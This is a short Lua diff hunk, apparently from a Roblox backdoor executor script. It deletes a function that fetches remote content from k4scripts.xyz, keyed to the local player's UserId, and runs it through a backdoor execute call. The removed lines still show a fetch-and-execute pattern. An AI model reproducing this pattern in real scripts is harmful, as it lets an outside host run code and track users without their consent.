@@ -443,15 +443,6 @@ local function resetExecutionState()
     ui.title.Text = TITLE;
 end;
 
-local function logGame()
-    local int, data = pcall(game.HttpGet, game, "https://k4scripts.xyz/bexe/token/" .. localPlayer.UserId);
-    if not int then
-        return;
-    end
-    execute(applyMacros(LOG_GAME):format(data), backdoor, false, true):Wait();
-end;
-
-
 btns.execBtn.MouseButton1Click:Connect(function()
     -- avoid multiple executions
     if executing then
